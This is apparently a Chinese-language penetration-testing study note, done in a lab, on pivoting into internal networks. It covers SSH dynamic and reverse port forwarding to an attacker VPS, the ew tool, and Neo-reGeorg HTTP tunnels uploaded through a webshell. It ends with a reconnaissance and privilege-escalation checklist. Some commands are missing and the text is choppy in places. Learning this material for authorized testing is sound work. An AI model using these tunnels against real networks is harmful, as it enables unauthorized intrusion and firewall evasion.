    端口转发(SSH隧道)

    先来介绍一下端口转发是什么作用，以及应用于什么场景。 简单来说就是将外网端口映射到本地端口来，比如我将192.168.200.143的3306端口(Mysql)，与我本地的3306端口进行转发，那么我访问本地的3306端口时，就通过主机去进行了一个转发，访问到了这台主机的3306端口。 这种方式最常见的就是通过SSH隧道去搭建端口转发的隧道。

    要求

    这种有一些最基本的要求，大部分时候是有可能满足的。

    1. 有SSH服务(开启22端口)
    2. 有SSH私钥或有账号密码(可以进行连接)
    3. 服务器上出网的 主要就是这样的一些要求，我们的这台192.168.200.143本来是没有的，我们下载一下。然后我们的Windows都可以自己连上了。然后我们来连一下吧。

    OK，这里就连好了，我们来试一下端口转发。其实一般这种情况，拿到SSH连接到交互式shell之后可以做的就很多了，这里我们只讲SSH连接可以搭的隧道。这里稍微提一下怎么拿到账号密码的，这里的防护做的比较简单，密码可以随意修改。

    然后就直接修改密码去登录了，还是比较简单的。(平常可能需要从数据库中再去查找) 然后这里介绍比较常用的，SSH搭建隧道

    动态转发

    这里说的动态转发，其实是一种全端口的转发，先上命令吧。

    反向转发

    当然，既然是内网攻防，那肯定有连不了的情况，比如这个时候还用SSH的隧道就需要用反向连接的方式。先讲明白是什么情况下吧。

    1. 跳板机没有公网IP，或者防火墙禁止外网进行SSH连接。
    2. 跳板机出网，可以访问网络资源 可以拿红日第一个靶机的来举例，内网的域控是不出网的，但是可以ping到我们的win7，也就是跳板机，如果他有SSH，并且我们拿到了一个webshell，就可以进行一个反向连接，并且这个反向连接，也可以开上面的socket5代理。
    1

    ssh -N -R 1080 公网IP/vpsip

    通过这个就可以直接反向连出来，然后开全网段了。

    ew

    先给出工具链接吧：https://github.com/idlefire/ew。通过这个去下对应主机的已编译好的文件即可。 通过webshell直接进行上传即可，然后有几种打的方式，这里也是讲常见的了，反向连接和正向连接。

    这种方式适用于主机可出网的情况。因为要出来连我们的攻击机，我们先上传好，然后本地开好(实际情况下需要VPS开)ew的监听。

    应用层封装隧道

    但是有些时候，这些常见的通信是不给的，TCP啊，或者直接的SSH，都是打不了的，而且主机还是不出网的情况，可能就需要一些应用层封装隧道来绕过这些防护去进行内网穿透。下面是比较常见的三种，分别都会介绍一种工具使用。

    HTTP 隧道：Neo-reGeorg

    先来介绍这种工具搭建隧道的方式。先安装工具吧， git clone https://github.com/L-codes/Neo-reGeorg.git 然后我们就可以进到他的目录下，生成一个搭建隧道的文件出来。

    1

    # 生成带密码的隧道脚本（-k 指定密码，必选）
python3 neoreg.py generate -k 123456
上传之后：
python neoreg.py -k 123456 -u http://192.168.200.143/tunnel.php -v --skip

    首先执行生成命令之后，就会出现这些文件。

    我们这里就拿这个PHP来举例了，毕竟环境是PHP环境。直接上传上去。

    直接访问是一个不可见编码的效果，然后我们打命令之后不是监听，但是应该是已经开起来了，我们可以去连接一下看看。

    一开始是命令打错了，需要加上-v和-skip参数才能正常执行，然后我们现在再去访问看看。很奇怪，这里也出问题，不能是今天运气不好吧，按理来说应该已经搭好代理了，但是就是连不上，很奇怪，而且又是我自己的环境，我貌似又能直接访问到，没走代理，就很奇怪。

    简单讲一下这个隧道的原理，是通过这个我们上传的文件，然后传输数据过去，过去之后呢，文件会对数据进行解码，解码完了会进行一个请求的发送，然后就造成了socket5的流量穿过了waf等，直接进行了访问。

    VPN三级隧道

    这个东西还挺有意思的，简单来说就是将攻击机和被攻击机都拉进来一个虚拟的网段，进这个虚拟网段了自然可以通过这个虚拟的网关去访问任意资源，相当于直接加入了他们的内网，而且是个虚拟人，并没有真实存在，只是通过隧道进来的。 然后这种就有三个比较常见的工具，这里讲基础的，另外两个都是很具体进阶的。

    总结

    最后稍微总结一下遇到的各种隧道，适用情况：

    1. 目标能出网 + 有 SSH 服务（22 端口） 最优选择：SSH 动态转发（Socks5）

        ssh -D 1080 user@目标IP
    • 代理：127.0.0.1:1080 SOCKS5
    • 适合：直接可控、能 SSH 登录
    1. 目标能出网，但无法被外网 SSH 连接 选择：SSH 反向隧道（反弹 Socks5）

        ssh -N -R 1080 VPS_IP -i 密钥 -o StrictHostKeyChecking=no

    内网信息收集

    前面学习了一下内网的信息收集，这里做一个小总结。 分了两个板块，因为打的命令不一样，所以设置为不一样的东西。

    基本思路

    先确定好我们想要去做什么信息收集，需要知道什么，而不是说随便查查，不知道要查什么东西。

    1. (可能存在) 通过历史漏洞或者suid之类的操作进行提权
    2. 目前主机的基本信息(Windows/Linux，物理机/docker机，主机权限，shell权限)
    3. 确定下一步渗透的目标(网段内其他主机，docker的宿主机，提升权限)
    4. 查看网络连通性以及目标信息(网段内IP存活探测，域后缀名，主机名，ping是否能通)
